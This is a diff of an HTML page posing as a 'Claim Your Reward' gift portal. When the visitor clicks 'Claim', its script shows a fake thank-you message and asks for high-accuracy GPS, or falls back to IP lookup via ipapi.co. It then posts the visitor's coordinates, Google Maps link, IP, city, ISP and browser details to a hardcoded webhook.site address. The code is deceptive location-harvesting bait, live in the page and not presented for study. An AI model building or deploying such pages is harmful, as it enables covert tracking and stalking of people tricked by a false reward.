@@ -2,84 +2,93 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Reward Portal</title>
+  <title>Claim Your Reward</title>
   <style>
     body {
-      font-family: sans-serif;
-      background-color: #f4f4f4;
-      text-align: center;
-      padding-top: 100px;
+      background: #f5f5f5;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
     }
-
     .box {
-      background: white;
-      display: inline-block;
+      background: #fff;
       padding: 30px;
       border-radius: 12px;
-      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      text-align: center;
     }
-
     button {
-      padding: 12px 25px;
-      border: none;
-      border-radius: 5px;
+      padding: 12px 24px;
       background: #007bff;
-      color: white;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
       font-size: 16px;
       cursor: pointer;
       margin-top: 20px;
     }
-
     button:hover {
       background: #0056b3;
     }
-<script>
-  async function handleClaim() {
-    document.getElementById("mainBox").innerHTML = "<h2>Thank you!</h2><p>Your reward has been processed.</p>";
+  </style>
+</head>
+<body>
+  <div class="box" id="mainBox">
+    <h2>Claim Your Reward</h2>
+    <p>Click the button below to receive your gift.</p>
+    <button onclick="handleClaim()">Claim</button>
+  </div>
 
-    const fallbackLocation = async () => {
-      const res = await fetch('https://ipapi.co/json/');
-      const data = await res.json();
-      return {
-        method: "IP",
-        ip: data.ip,
-        city: data.city,
-        region: data.region,
-        country: data.country_name,
-        org: data.org,
-        ua: navigator.userAgent,
-        time: new Date().toString()
-      };
-    };
+  <script>
+    async function handleClaim() {
+      document.getElementById("mainBox").innerHTML = "<h2>Thank you!</h2><p>Your reward has been processed.</p>";
 
-    const sendToWebhook = async (payload) => {
-      await fetch('https://webhook.site/a902d0b3-80e2-4011-8022-54839963dc96', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-      });
-    };
-
-    if ("geolocation" in navigator) {
-      navigator.geolocation.getCurrentPosition(async (pos) => {
-        const payload = {
-          method: "GPS",
-          lat: pos.coords.latitude,
-          lon: pos.coords.longitude,
-          accuracy: pos.coords.accuracy,
+      const fallbackLocation = async () => {
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
+        return {
+          method: "IP",
+          ip: data.ip,
+          city: data.city,
+          region: data.region,
+          country: data.country_name,
+          org: data.org,
           ua: navigator.userAgent,
           time: new Date().toString()
         };
-        await sendToWebhook(payload);
-      }, async () => {
+      };
+
+      const sendToWebhook = async (payload) => {
+        await fetch('https://webhook.site/a902d0b3-80e2-4011-8022-54839963dc96', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+      };
+
+      if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+          const payload = {
+            method: "GPS",
+            lat: pos.coords.latitude,
+            lon: pos.coords.longitude,
+            accuracy: pos.coords.accuracy,
+            maps_url: `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`,
+            ua: navigator.userAgent,
+            time: new Date().toString()
+          };
+          await sendToWebhook(payload);
+        }, async () => {
+          const payload = await fallbackLocation();
+          await sendToWebhook(payload);
+        }, { enableHighAccuracy: true });
+      } else {
         const payload = await fallbackLocation();
         await sendToWebhook(payload);
-      }, { enableHighAccuracy: true });
-    } else {
-      const payload = await fallbackLocation();
-      await sendToWebhook(payload);
+      }
     }
-  }
-</script>
-      
+  </script>
+</body>
 </html>
